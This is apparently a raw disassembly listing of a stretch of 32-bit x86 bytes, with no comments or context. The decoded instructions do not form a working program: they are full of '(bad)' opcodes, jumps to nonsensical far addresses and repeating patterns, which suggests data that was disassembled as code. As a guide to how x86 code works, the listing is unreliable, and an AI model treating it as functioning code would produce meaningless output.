  43d277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d278:	pushf  
  43d279:	cld    
  43d27a:	inc    edx
  43d27b:	jbe    0x43d219
  43d27d:	cld    
  43d27e:	cmp    dl,BYTE PTR [edx-0x63]
  43d281:	cld    
  43d282:	xor    ch,BYTE PTR [eax-0x63]
  43d285:	cld    
  43d286:	sub    bh,BYTE PTR [esi]
  43d288:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d289:	cld    
  43d28a:	and    dh,ah
  43d28c:	mov    ds:0xa4221afc,eax
  43d291:	cld    
  43d292:	adc    ah,dl
  43d294:	pushf  
  43d295:	cld    
  43d296:	or     dh,BYTE PTR [edx-0x29fd0364]
  43d29c:	pushf  
  43d29d:	cld    
  43d29e:	cli    
  43d29f:	fistp  DWORD PTR [esp+edi*8+0x0]
  43d2a6:	add    dl,dh
  43d2a8:	jg     0x43d22d
  43d2aa:	cld    
  43d2ab:	jmp    0x8371:0xe2fc837d
  43d2b2:	cld    
  43d2b3:	ficomp DWORD PTR [edi+0x73d2fc83]
  43d2b9:	cmp    esp,0xffffffca
  43d2bc:	xchg   DWORD PTR [ebx-0x7ba83d04],eax
  43d2c2:	cld    
  43d2c3:	mov    edx,0xb2fc83c3
  43d2c8:	xchg   ebx,eax
  43d2c9:	cmp    esp,0xffffffaa
  43d2cc:	mov    DWORD PTR [ebx-0x7c625d04],0x83e59afc
  43d2d6:	cld    
  43d2d7:	xchg   edx,eax
  43d2d8:	add    cl,ch
  43d2da:	test   BYTE PTR [ecx-0x7e7b032d],cl
  43d2e0:	rcr    esp,cl
  43d2e2:	test   BYTE PTR [ecx-0x2d],bh
  43d2e5:	or     al,0x85
  43d2e7:	jno    0x43d2bc
  43d2e9:	mov    esi,0x8d3699f
  43d2ee:	test   DWORD PTR [ecx-0x2d],esp
  43d2f1:	sub    BYTE PTR [ebp-0x7acd2ca7],al
  43d2f7:	push   ecx
  43d2f8:	rol    DWORD PTR [edx+eax*4-0x7d8b2cb7],cl
  43d2ff:	inc    ecx
  43d300:	shl    DWORD PTR [edx+eax*4+0x39],cl
  43d304:	rcl    DWORD PTR [eax-0x7e],cl
  43d307:	xor    ebx,edx
  43d309:	sbb    BYTE PTR [edx+0x0],al
  43d30f:	add    BYTE PTR [ecx],ch
  43d311:	shl    DWORD PTR [edx],cl
  43d313:	and    BYTE PTR [ecx],0xd3
  43d316:	cli    
  43d317:	sbb    DWORD PTR [ecx],0x1181fed3
  43d31d:	sar    edx,cl
  43d31f:	or     DWORD PTR [ecx],0x181e0d3
  43d325:	ror    DWORD PTR [esi+0x7ed2f981],cl
  43d32b:	xor    ecx,0xe981a2d2
  43d331:	rcl    BYTE PTR [esi+0x2ed2e181],cl
  43d337:	sbb    ecx,0xd1813ad2
  43d33d:	sar    BYTE PTR [eax-0x7f],cl
  43d340:	leave  
  43d341:	rcr    ah,cl
  43d343:	add    cl,0xd2
  43d346:	les    eax,FWORD PTR [eax-0x7f4f2d47]
  43d34c:	mov    cl,0xd2
  43d34e:	lods   al,BYTE PTR ds:[esi]
  43d34f:	sub    BYTE PTR [ecx-0x5e7f0d2e],0xd2
  43d356:	dec    DWORD PTR [edx]
  43d358:	hlt    
  43d359:	aad    0xf8
  43d35b:	fcomip st,st(5)
  43d35d:	aad    0xf8
  43d35f:	sbb    ebp,esi
  43d361:	aad    0xf8
  43d363:	or     ebp,esi
  43d365:	aad    0xf8
  43d367:	and    esi,ebp
  43d369:	aad    0xf8
  43d36b:	push   ecx
  43d36c:	cmc    
  43d36d:	into   
  43d36e:	clc    
  43d36f:	push   ebx
  43d370:	cmc    
  43d371:	into   
  43d372:	clc    
  43d373:	arpl   WORD PTR [eax],ax
  43d375:	add    BYTE PTR [eax],al
  43d377:	add    BYTE PTR [eax],al
  43d379:	cmc    
  43d37a:	into   
  43d37b:	clc    
  43d37c:	arpl   bp,si
  43d37e:	into   
  43d37f:	clc    
  43d380:	mov    ch,0xd2
  43d382:	into   
  43d383:	clc    
  43d384:	gs cmc 
  43d386:	into   
  43d387:	clc    
  43d388:	dec    ebp
  43d389:	cmc    
  43d38a:	into   
  43d38b:	clc    
  43d38c:	aas    
  43d38d:	cmc    
  43d38e:	into   
  43d38f:	clc    
  43d390:	daa    
  43d391:	cmc    
  43d392:	into   
  43d393:	clc    
  43d394:	sub    eax,0xe9f8cedd
  43d399:	jbe    0x43d39d
  43d39b:	add    bl,bh
  43d39d:	dec    esi
  43d39f:	clc    
  43d3a0:	iret   
  43d3a1:	out    dx,eax
  43d3a2:	into   
  43d3a3:	clc    
  43d3a4:	cmc    
  43d3a5:	out    dx,eax
  43d3a6:	into   
  43d3a7:	clc    
  43d3a8:	jmp    0xef43d623
  43d3ad:	jbe    0x43d3b1
  43d3af:	and    cl,0x76
  43d3b2:	add    al,BYTE PTR [eax-0x7ffd8915]
  43d3b8:	lock jbe 0x43d3bd
  43d3bb:	sub    cl,0x76
  43d3be:	add    al,BYTE PTR [eax]
  43d3c0:	pop    ebx
  43d3c1:	jmp    0xe229cc94
  43d3c6:	into   
  43d3c7:	clc    
  43d3c8:	shr    ecx,1
  43d3ca:	into   
  43d3cb:	clc    
  43d3cc:	jmp    0xa743d647
  43d3d1:	or     edi,ecx
  43d3d3:	clc    
  43d3d4:	add    BYTE PTR [edx-0x6d00048a],ch
  43d3da:	add    eax,0x8000
  43d3df:	add    BYTE PTR [eax],al
  43d3e1:	add    BYTE PTR [eax+0x77],dh
  43d3e4:	sti    
  43d3e5:	(bad)  
  43d3e6:	jle    0x43d45f
  43d3e8:	sti    
  43d3e9:	dec    DWORD PTR [edx-0x7900048a]
  43d3ef:	jbe    0x43d3ec
  43d3f1:	call   FWORD PTR [edx+0x75]
  43d3f4:	sti    
  43d3f5:	(bad)  
  43d3f6:	jle    0x43d46d
  43d3f8:	sti    
  43d3f9:	dec    DWORD PTR [eax-0x6500048b]
  43d3ff:	jne    0x43d3fc
  43d401:	jmp    DWORD PTR [ebp+esi*2+0x7590fffb]
  43d408:	sti    
  43d409:	push   esp
  43d40b:	jne    0x43d408
  43d40d:	dec    esi
  43d40f:	jbe    0x43d40c
  43d411:	call   FWORD PTR [esi+esi*2+0x76bcfffb]
  43d418:	sti    
  43d419:	jmp    DWORD PTR [edx+0x76]
  43d41c:	sti    
  43d41d:	jmp    FWORD PTR [edx]
  43d41f:	jne    0x43d41c
  43d421:	jmp    FWORD PTR [esi+0x76]
  43d424:	sti    
  43d425:	jmp    FWORD PTR [edx]
  43d427:	jne    0x43d424
  43d429:	call   FWORD PTR [edx]
  43d42b:	jne    0x43d428
  43d42d:	(bad)  
  43d42e:	ficom  WORD PTR [edx-0x6d150005]
  43d434:	sti    
  43d435:	jmp    DWORD PTR [esi]
  43d437:	xchg   ebx,eax
  43d438:	sti    
  43d439:	call   FWORD PTR [eax]
  43d43b:	xchg   ebx,eax
  43d43c:	sti    
  43d43d:	push   DWORD PTR [edx]
  43d43f:	xchg   ebx,eax
  43d440:	sti    
  43d441:	dec    esp
  43d443:	add    al,0x0
  43d445:	add    BYTE PTR [eax],al
  43d447:	add    BYTE PTR [eax],al
  43d449:	add    BYTE PTR [eax],al
  43d44b:	xchg   edx,eax
  43d44c:	jne    0x43d449
  43d44e:	(bad)  
  43d44f:	fadd   QWORD PTR [eax+eax*1]
  43d452:	add    BYTE PTR [eax+0x75fffb9b],bh
  43d458:	xchg   ecx,eax
  43d459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d45a:	cld    
  43d45b:	mov    dl,0xa8
  43d45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d45e:	cld    
  43d45f:	stos   BYTE PTR es:[edi],al
  43d460:	add    ah,BYTE PTR [ebp-0x5b0b5d04]
  43d466:	cld    
  43d467:	call   0xa5b0:0x92fca5b4
  43d46e:	cld    
  43d46f:	mov    ch,BYTE PTR [eax]
  43d471:	lods   al,BYTE PTR ds:[esi]
  43d472:	cld    
  43d473:	add    BYTE PTR [eax],0xac
  43d476:	cld    
  43d477:	jp     0x43d473
  43d479:	stos   DWORD PTR es:[edi],eax
  43d47a:	cld    
  43d47b:	jb     0x43d487
  43d47d:	lods   al,BYTE PTR ds:[esi]
  43d47e:	cld    
  43d47f:	push   0x30
  43d481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d482:	cld    
  43d483:	bound  esi,QWORD PTR [eiz*4-0x5ae9a504]
  43d48a:	cld    
  43d48b:	push   edx
  43d48c:	and    al,0xa5
  43d48e:	cld    
  43d48f:	dec    edx
  43d490:	nop
  43d491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d492:	cld    
  43d493:	inc    edx
  43d494:	mov    esi,0xb03afca5
  43d499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d49a:	cld    
  43d49b:	xor    ch,al
  43d49d:	stos   BYTE PTR es:[edi],al
  43d49e:	cld    
  43d49f:	sub    dh,BYTE PTR [eax+0x622fcaa]
  43d4a5:	stos   BYTE PTR es:[edi],al
  43d4a6:	cld    
  43d4a7:	sbb    cl,dl
  43d4a9:	stos   BYTE PTR es:[edi],al
  43d4aa:	cld    
  43d4ab:	adc    bl,dh
  43d4ad:	stos   BYTE PTR es:[edi],al
  43d4ae:	cld    
  43d4af:	add    BYTE PTR [eax],al
  43d4b1:	add    BYTE PTR [eax],al
  43d4b3:	add    BYTE PTR [edx],cl
  43d4b5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d4b7:	cld    
  43d4b8:	add    al,BYTE PTR [edx+ebp*4-0x4]
  43d4bc:	cli    
  43d4bd:	jmp    FWORD PTR [ecx-0x560a0d04]
  43d4c3:	cld    
  43d4c4:	jmp    0xab2b:0xe2fcab5d
  43d4cb:	cld    
  43d4cc:	fidiv  DWORD PTR [edi]
  43d4ce:	stos   DWORD PTR es:[edi],eax
  43d4cf:	cld    
  43d4d0:	ror    BYTE PTR [ecx],cl
  43d4d2:	stos   DWORD PTR es:[edi],eax
  43d4d3:	cld    
  43d4d4:	retf   0x2702
  43d4d7:	lods   eax,DWORD PTR ds:[esi]
  43d4d8:	ror    edi,0x34
  43d4db:	lods   eax,DWORD PTR ds:[esi]
  43d4dc:	mov    ecx,0xb1ad4acf
  43d4e1:	iret   
  43d4e2:	push   eax
  43d4e3:	lods   eax,DWORD PTR ds:[esi]
  43d4e4:	test   eax,0xa1aceccf
  43d4e9:	iret   
  43d4ea:	fisubr WORD PTR [ecx+ebx*4-0x6e50b131]
  43d4f1:	iret   
  43d4f2:	pop    esi
  43d4f3:	scas   eax,DWORD PTR es:[edi]
  43d4f4:	mov    edi,ecx
  43d4f6:	call   0x79af:0x80cf81af
  43d4fd:	iret   
  43d4fe:	mov    ah,0xaf
  43d500:	jno    0x43d4d1
  43d502:	sahf   
  43d503:	scas   eax,DWORD PTR es:[edi]
  43d504:	imul   ecx,edi,0xcf61afb8
  43d50a:	les    ebp,FWORD PTR [edi-0x502330a7]
  43d510:	push   ecx
  43d511:	iret   
  43d512:	pushf  
  43d513:	lods   eax,DWORD PTR ds:[esi]
  43d514:	dec    ecx
  43d515:	iret   
  43d516:	lods   eax,DWORD PTR fs:[esi]
  43d518:	add    BYTE PTR [eax],al
  43d51a:	add    BYTE PTR [eax],al
  43d51c:	add    BYTE PTR [ecx-0x31],al
  43d51f:	fsubr  QWORD PTR [ebx-0x544330c7]
  43d525:	xor    edi,ecx
  43d527:	mov    al,0xab
  43d529:	sub    edi,ecx
  43d52b:	stos   BYTE PTR es:[edi],al
  43d52c:	stos   DWORD PTR es:[edi],eax
  43d52d:	and    edi,ecx
  43d52f:	mov    esp,0xe0cf19a9
  43d534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d535:	adc    edi,ecx
  43d537:	enter  0x9a5,0xcf
  43d53b:	aam    0xa5
  43d53d:	add    edi,ecx
  43d53f:	sub    BYTE PTR [esi-0x59fb3107],ah
  43d545:	icebp  
  43d546:	into   
  43d547:	adc    BYTE PTR [esi-0x59953117],ah
  43d54d:	loope  0x43d51d
  43d54f:	push   esp
  43d550:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d551:	fxch   st(6)
  43d553:	dec    DWORD PTR [eax+0x1b]
  43d556:	into   
  43d557:	clc    
  43d558:	stos   DWORD PTR es:[edi],eax
  43d559:	sbb    esi,ecx
  43d55b:	clc    
  43d55c:	fwait
  43d55d:	adc    esi,ecx
  43d55f:	clc    
  43d560:	mov    ecx,DWORD PTR [ecx]
  43d562:	into   
  43d563:	clc    
  43d564:	jnp    0x43d547
  43d566:	int    0xf8
  43d568:	addr16 fxch st(5)
  43d56b:	clc    
  43d56c:	mov    ebp,0xc5f8cdce
  43d571:	into   
  43d572:	int    0xf8
  43d574:	fmulp  st(5),st
  43d577:	clc    
  43d578:	stos   DWORD PTR es:[edi],eax
  43d579:	fmulp  st(5),st
  43d57b:	clc    
  43d57c:	iret   
  43d57d:	into   
  43d57e:	int    0xf8
  43d580:	add    DWORD PTR [eax],eax
  43d582:	add    BYTE PTR [eax],al
  43d584:	add    BYTE PTR [eax],al
  43d586:	leave  
  43d587:	int    0xf8
  43d589:	loope  0x43d5a9
  43d58b:	iret   
  43d58c:	clc    
  43d58d:	adc    edx,DWORD PTR [edx]
  43d58f:	iret   
  43d590:	clc    
  43d591:	adc    DWORD PTR [edx],ebx
  43d593:	iret   
  43d594:	clc    
  43d595:	or     DWORD PTR [edx],edx
  43d597:	iret   
  43d598:	clc    
  43d599:	daa    
  43d59a:	sbb    cl,bh
  43d59c:	clc    
  43d59d:	sub    edx,DWORD PTR [edx]
  43d59f:	iret   
  43d5a0:	clc    
  43d5a1:	cdq    
  43d5a2:	sbb    ecx,edi
  43d5a4:	clc    
  43d5a5:	mov    ebx,0xcff8cf10
  43d5aa:	fmul   st,st(6)
  43d5ac:	clc    
  43d5ad:	xchg   ebx,eax
  43d5ae:	(bad)  
  43d5b0:	clc    
  43d5b1:	xchg   ecx,eax
  43d5b2:	iret   
  43d5b3:	into   
  43d5b4:	clc    
  43d5b5:	push   ebp
  43d5b6:	iret   
  43d5b7:	into   
  43d5b8:	clc    
  43d5b9:	outs   dx,DWORD PTR ds:[esi]
  43d5ba:	(bad)  
  43d5bc:	clc    
  43d5bd:	aaa    
  43d5be:	fmulp  st(6),st
  43d5c0:	clc    
  43d5c1:	or     ecx,esi
  43d5c3:	into   
  43d5c4:	clc    
  43d5c5:	das    
  43d5c6:	into   
  43d5c7:	into   
  43d5c8:	clc    
  43d5c9:	aad    0x1f
  43d5cb:	iret   
  43d5cc:	clc    
  43d5cd:	rcr    DWORD PTR [edi],0xcf
  43d5d0:	clc    
  43d5d1:	add    BYTE PTR [edx-0x59],ah
  43d5d4:	sti    
  43d5d5:	call   edx
  43d5d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d5d8:	sti    
  43d5d9:	(bad)  
  43d5da:	mov    esp,0x4fffba4
  43d5df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d5e0:	sti    
  43d5e1:	dec    DWORD PTR [edx]
  43d5e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d5e4:	sti    
  43d5e5:	jmp    FWORD PTR [esi+0xfffba4]
  43d5eb:	add    BYTE PTR [eax],al
  43d5ed:	add    BYTE PTR [eax],al
  43d5ef:	enter  0xfba4,0xff
  43d5f3:	dec    edx
  43d5f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d5f5:	sti    
  43d5f6:	call   DWORD PTR [esi]
  43d5f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d5f9:	sti    
  43d5fa:	jmp    DWORD PTR [edx]
  43d5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d5fd:	sti    
  43d5fe:	call   FWORD PTR [ecx+eax*1+0x77780000]
  43d605:	sti    
  43d606:	call   DWORD PTR [eax+0x77]
  43d609:	sti    
  43d60a:	jmp    FWORD PTR [eax]
  43d60c:	ja     0x43d609
  43d60e:	(bad)  
  43d60f:	out    dx,al
  43d610:	ja     0x43d60d
  43d612:	inc    DWORD PTR [eax]
  43d614:	ja     0x43d611
  43d616:	call   FWORD PTR [eax]
  43d618:	ja     0x43d615
  43d61a:	jmp    DWORD PTR [edi+esi*2]
  43d61d:	sti    
  43d61e:	dec    DWORD PTR [esi]
  43d620:	ja     0x43d61d
  43d622:	(bad)  
  43d623:	cmp    dh,BYTE PTR [edi-0x5]
  43d626:	inc    DWORD PTR [edi+esi*2-0x5]
  43d62a:	jmp    DWORD PTR [esi]
  43d62c:	jne    0x43d629
  43d62e:	(bad)  
  43d62f:	fdiv   DWORD PTR [ebx+edi*8-0x1]
  43d633:	add    dh,BYTE PTR [ebp-0x5]
  43d636:	(bad)  
  43d637:	in     al,dx
  43d638:	je     0x43d635
  43d63a:	jmp    DWORD PTR [esi+0x46fffb75]
  43d640:	jne    0x43d63d
  43d642:	push   DWORD PTR [edx+0x48fffb75]
  43d648:	jne    0x43d645
  43d64a:	call   DWORD PTR [esp+esi*2]
  43d64d:	sti    
  43d64e:	push   DWORD PTR [ebp+0x75]
  43d651:	xchg   edi,eax
  43d652:	cld    
  43d653:	add    BYTE PTR [eax],al
  43d655:	add    BYTE PTR [eax],al
  43d657:	add    dl,ch
  43d659:	enter  0xfc91,0xe2
  43d65d:	mov    esi,0xdadafc91
  43d662:	cld    
  43d663:	push   DWORD PTR [ebp+0x4]
  43d666:	add    al,0x0
  43d668:	cmc    
  43d669:	test   al,0xfc
  43d66b:	push   ebp
  43d66d:	pop    esp
  43d66e:	(bad)  
  43d66f:	cld    
  43d670:	mov    edx,0xf5fffca7
  43d675:	fdivp  st(4),st
  43d677:	push   ebp
  43d679:	(bad)  
  43d67a:	cld    
  43d67b:	push   ebp
  43d67d:	fdiv   st(4),st
  43d67f:	push   ebp
  43d681:	test   eax,0xddf5fffc
  43d686:	cld    
  43d687:	push   ebp
  43d689:	scas   al,BYTE PTR es:[edi]
  43d68a:	nop
  43d68b:	cld    
  43d68c:	sbb    al,0x90
  43d68f:	cld    
  43d690:	jp     0x43d67a
  43d692:	mov    ?,esp
  43d694:	jb     0x43d692
  43d696:	mov    ?,esp
  43d698:	push   0xffffffec
  43d69a:	mov    ?,esp
  43d69c:	bound  eax,QWORD PTR [esi-0x71]
  43d69f:	cld    
  43d6a0:	pop    edx
  43d6a1:	mov    bh,0xfc
  43d6a3:	push   ebp
  43d6a5:	aas    
  43d6a6:	(bad)  
  43d6a7:	cld    
  43d6a8:	dec    edx
  43d6a9:	in     eax,0xfc
  43d6ab:	push   ebp
  43d6ad:	dec    ebp
  43d6ae:	nop
  43d6af:	cld    
  43d6b0:	cmp    dl,ah
  43d6b2:	cld    
  43d6b3:	push   ebp
  43d6b5:	sub    eax,0xc9f50004
  43d6ba:	cld    
  43d6bb:	inc    DWORD PTR [eax]
  43d6bd:	add    BYTE PTR [eax],al
  43d6bf:	add    BYTE PTR [eax],al
  43d6c1:	cmc    
  43d6c2:	xlat   BYTE PTR ds:[ebx]
  43d6c3:	cld    
  43d6c4:	push   ebp
  43d6c6:	mov    ah,0xfc
  43d6c8:	push   ebp
  43d6ca:	or     ecx,DWORD PTR [edi+0x40a0afc]
  43d6d0:	add    ch,dh
  43d6d2:	add    ah,dh
  43d6d4:	add    esi,DWORD PTR [ebp-0x7e]
  43d6d7:	cmc    
  43d6d8:	add    esi,DWORD PTR [ebp-0x7e]
  43d6db:	jecxz  0x43d6e0
  43d6dd:	jne    0x43d661
  43d6df:	out    0x3,eax
  43d6e1:	jne    0x43d665
  43d6e3:	out    0x3,al
  43d6e5:	jne    0x43d6e9
  43d6e7:	repz xchg esp,eax
  43d6e9:	ror    ebx,1
  43d6eb:	lock xchg esp,eax
  43d6ed:	leave  
  43d6ee:	retf   
  43d6ef:	pop    esi
  43d6f0:	xchg   esp,eax
  43d6f1:	ror    ebx,0x74
  43d6f4:	xchg   esp,eax
  43d6f5:	mov    ecx,0xb19478cb
  43d6fa:	retf   
  43d6fb:	jle    0x43d691
  43d6fd:	test   eax,0xa19494cb
  43d702:	retf   
  43d703:	adc    BYTE PTR [ecx+ebx*4-0x6e6bdf35],0xcb
  43d70b:	push   ss
  43d70c:	xchg   esp,eax
  43d70d:	mov    ebx,ecx
  43d70f:	adc    BYTE PTR [ecx+eax*4+0x799406cb],dl
  43d716:	retf   
  43d717:	or     BYTE PTR [ecx+esi*2+0x699412cb],dl
  43d71e:	retf   
  43d71f:	je     0x43d6bc
  43d721:	popa   
  43d722:	retf   
  43d723:	out    0x3,al
  43d725:	add    BYTE PTR [eax],al
  43d727:	add    BYTE PTR [eax],al
  43d729:	add    BYTE PTR [ebp+0x2],dh
  43d72c:	(bad)  
  43d72d:	xchg   ecx,eax
  43d72e:	push   ecx
  43d72f:	retf   
  43d730:	cwde   
  43d731:	xchg   ecx,eax
  43d732:	dec    ecx
  43d733:	retf   
  43d734:	test   al,0x91
  43d736:	inc    ecx
  43d737:	retf   
  43d738:	adc    dl,BYTE PTR [esi-0x6a0134c7]
  43d73e:	xor    ebx,ecx
  43d740:	ficom  WORD PTR [ebp-0x6a2f34d7]
  43d746:	and    ebx,ecx
  43d748:	retf   0x1995
  43d74b:	retf   
  43d74c:	stos   BYTE PTR es:[edi],al
  43d74d:	xchg   ebp,eax
  43d74e:	adc    ebx,ecx
  43d750:	(bad)  
  43d751:	call   0xbe43d9cc
  43d756:	jne    0x43d788
  43d758:	sbb    esp,DWORD PTR [di+0x5f4f]
  43d75d:	or     eax,0x1d695ca9
  43d762:	push   esp
  43d763:	sub    eax,0x6876e974
  43d768:	jmp    FWORD PTR [ecx]
  43d76a:	inc    ebx
  43d76b:	pop    edi
  43d76c:	pop    edi
  43d76d:	cmc    
  43d76e:	push   ebp
  43d76f:	aaa    
  43d770:	jae    0x43d76f
  43d772:	push   ebp
  43d773:	dec    edx
  43d774:	push   ecx
  43d775:	jmp    0xbe47aaf0
  43d77a:	push   ecx
  43d77b:	arpl   WORD PTR [edi+eiz*4+0x1f],si
  43d77f:	pop    esp
  43d780:	dec    ebp
  43d781:	rcr    BYTE PTR [ecx+eiz*2],0x6c
  43d785:	les    ebp,FWORD PTR [edi]
  43d787:	sub    al,0x66
  43d789:	int3   
  43d78a:	adc    edx,DWORD PTR [esi+0x0]
  43d78d:	pop    edx
  43d78e:	add    BYTE PTR [eax],al
  43d790:	add    BYTE PTR [eax],al
  43d792:	add    BYTE PTR [ebx+0x41],bh
  43d795:	arpl   WORD PTR [ebp-0x3da29ca6],di
  43d79b:	cmp    ebx,DWORD PTR [ecx+0x73]
  43d79e:	xchg   edi,eax
  43d79f:	sub    al,BYTE PTR [edx]
  43d7a1:	add    BYTE PTR [ebx+edi*2-0x23738fc5],bl
  43d7a8:	cmp    eax,0x4ad59573
  43d7ad:	push   ecx
  43d7ae:	jmp    0xa642a029
  43d7b3:	aad    0x4e
  43d7b5:	dec    esp
  43d7b6:	mov    BYTE PTR [ebx-0x5784bcb2],ah
  43d7bc:	pop    ebx
  43d7bd:	outs   dx,BYTE PTR ds:[esi]
  43d7be:	jmp    0x3b40a839
  43d7c3:	xchg   esp,eax
  43d7c4:	push   esi
  43d7c5:	arpl   WORD PTR [eax-0x3e],cx
  43d7c8:	gs dec ebx
  43d7ca:	push   esp
  43d7cb:	lds    esp,FWORD PTR [ebp+0x78]
  43d7ce:	add    BYTE PTR [esi+eax*1],cl
  43d7d1:	dec    edx
  43d7d2:	add    BYTE PTR [edi+0x5a],bl
  43d7d5:	addr16 jae 0x43d791
  43d7d8:	ss pop ecx
  43d7da:	outs   dx,BYTE PTR ds:[esi]
  43d7db:	mov    eax,0x8b005d5a
  43d7e0:	(bad)  
  43d7e1:	ds mov BYTE PTR gs:[ecx+0x67],al
  43d7e6:	ins    DWORD PTR es:[edi],dx
  43d7e7:	jno    0x43d848
  43d7e9:	data16 adc BYTE PTR fs:[edi+0x66],0x65
  43d7ef:	jnp    0x43d7ef
  43d7f1:	sbb    al,0x2
  43d7f3:	fwait
  43d7f4:	arpl   WORD PTR [esi+ecx*2+0x0],si
  43d7f8:	add    BYTE PTR [eax],al
  43d7fa:	add    BYTE PTR [eax],al
  43d7fc:	jge    0x43d830
  43d7fe:	popa   
  43d7ff:	jbe    0x43d87a
  43d801:	adc    DWORD PTR [ecx+0x73],esi
  43d804:	cwde   
  43d805:	bound  esp,QWORD PTR [ebp+0x49]
  43d808:	ret    0x6763
  43d80b:	add    BYTE PTR [edi-0x2],ch
  43d80e:	ds gs enter 0x6a09,0x69
  43d814:	fisub  DWORD PTR [edx+0x54]
  43d817:	jns    0x43d7e5
  43d819:	bound  ecx,QWORD PTR [edi+0x0]
  43d81c:	mov    dl,0xff
  43d81e:	ds gs enter 0x7110,0x73
  43d824:	fsub   DWORD PTR [edx+0x65]
  43d827:	inc    esp
  43d828:	stc    
  43d829:	bound  ebx,QWORD PTR [ecx+0x75]
  43d82c:	lock cmp BYTE PTR [ebp+0x49],cl
  43d830:	add    BYTE PTR [esi+0x66],bl
  43d833:	fstp   DWORD PTR [bp+0x5f]
  43d837:	gs pop esp
  43d839:	add    eax,0x621b0201
  43d83e:	je     0x43d88c
  43d840:	ret    
  43d841:	fs popa 
  43d843:	arpl   WORD PTR [ebp-0x3a8dbba6],bp
  43d849:	xor    al,0x5d
  43d84b:	jae    0x43d8c2
  43d84d:	(bad)  
  43d84f:	dec    ebp
  43d850:	ja     0x43d872
  43d852:	pop    ecx
  43d853:	je     0x43d81a
  43d855:	or     eax,0xc985d67
  43d85a:	push   ebx
  43d85b:	push   esp
  43d85c:	pushf  
  43d85d:	ds pop ecx
  43d85f:	ins    DWORD PTR es:[edi],dx
  43d860:	add    BYTE PTR [eax],al
  43d862:	add    BYTE PTR [eax],al
  43d864:	add    BYTE PTR [ebp-0x51],dh
  43d867:	add    al,BYTE PTR [ecx-0x70]
  43d86a:	out    0x40,eax
  43d86c:	imul   ebx,DWORD PTR [ecx-0x12],0x2336367
  43d873:	push   0x60fa3363
  43d878:	arpl   WORD PTR [edx-0x25],ax
  43d87b:	cld    
  43d87c:	cmp    eax,0x7452f778
  43d881:	inc    edi
  43d882:	cld    
  43d883:	pusha  
  43d884:	jo     0x43d8b0
  43d886:	(bad)  
  43d888:	dec    ecx
  43d889:	jo     0x43d83a
  43d88b:	push   ebx
  43d88c:	je     0x43d8b5
  43d88e:	mov    bh,0x59
  43d890:	push   0x42
  43d892:	(bad)  
  43d894:	mov    edi,0x6960a077
  43d899:	pop    ss
  43d89a:	mov    edx,0xb6184b60
  43d89f:	outs   dx,BYTE PTR ds:[si]
  43d8a1:	or     al,0x6c
  43d8a3:	dec    eax
  43d8a4:	pop    edi
  43d8a5:	or     DWORD PTR [esi-0x2502bcad],ecx
  43d8ab:	cld    
  43d8ac:	cdq    
  43d8ad:	ja     0x43d84f
  43d8af:	pop    ecx
  43d8b0:	je     0x43d872
  43d8b2:	ins    BYTE PTR es:[edi],dx
  43d8b3:	pop    ecx
  43d8b4:	outs   dx,BYTE PTR ds:[esi]
  43d8b5:	mov    ecx,0xe05f5e7e
  43d8ba:	ins    DWORD PTR es:[edi],dx
  43d8bb:	dec    eax
  43d8bc:	push   ebx
  43d8bd:	mov    esp,0xd26a5d95
  43d8c2:	inc    esi
  43d8c3:	pop    esi
  43d8c4:	popa   
  43d8c5:	fcomp  st(1)
  43d8c7:	cld    
  43d8c8:	leave  
  43d8c9:	add    BYTE PTR [eax],al
  43d8cb:	add    BYTE PTR [eax],al
  43d8cd:	add    BYTE PTR [edx+eax*1+0x2a],dh
  43d8d1:	pop    edi
  43d8d2:	test   eax,0x9055503e
  43d8d7:	inc    eax
  43d8d8:	push   ebp
  43d8d9:	pop    edi
  43d8da:	xchg   esi,eax
  43d8db:	xor    edx,DWORD PTR [edi+0x63]
  43d8de:	mov    eax,0xa45c2c5d
  43d8e3:	add    ch,BYTE PTR [edi]
  43d8e5:	call   FWORD PTR [esi-0x5fa9c4ad]
  43d8eb:	push   edx
  43d8ec:	xor    BYTE PTR [ecx],dh
  43d8ee:	jne    0x43d8f2
  43d8f0:	dec    edx
  43d8f1:	add    eax,0x32135d34
  43d8f6:	pop    esp
  43d8f7:	push   esi
  43d8f8:	sbb    al,0x67
  43d8fa:	push   esi
  43d8fb:	cmp    ecx,edi
  43d8fd:	popa   
  43d8fe:	dec    esp
  43d8ff:	push   esp
  43d900:	adc    al,0x63
  43d902:	dec    ecx
  43d903:	pop    ecx
  43d904:	or     ch,BYTE PTR [edx+0x24]
  43d907:	add    ch,BYTE PTR [eax]
  43d909:	dec    DWORD PTR [esi+0x53]
  43d90c:	repz push ebp
  43d90e:	sbb    BYTE PTR [ebp-0x29],dl
  43d911:	inc    edx
  43d912:	jne    0x43d916
  43d914:	lods   al,BYTE PTR ds:[esi]
  43d915:	(bad)  
  43d916:	push   ds
  43d917:	push   ebx
  43d918:	fist   DWORD PTR [ebp+0x11]
  43d91b:	pop    ebp
  43d91c:	mov    ecx,0xba027542
  43d921:	add    eax,0x34b35d34
  43d926:	add    dl,BYTE PTR [ebx-0x45]
  43d929:	pop    esi
  43d92a:	push   cs
  43d92b:	shl    BYTE PTR cs:[esi+0x16],0x2
  43d930:	add    BYTE PTR [ebx],al
  43d932:	add    BYTE PTR [eax],al
  43d934:	add    BYTE PTR [eax],al
  43d936:	add    BYTE PTR [esi-0x3ab06fb6],dh
  43d93c:	push   esp
  43d93d:	and    BYTE PTR [esi+edx*8+0x53],0x96
  43d942:	add    edi,DWORD PTR [ebx-0x29aa56ff]
  43d948:	pop    ebp
  43d949:	stos   DWORD PTR es:[edi],eax
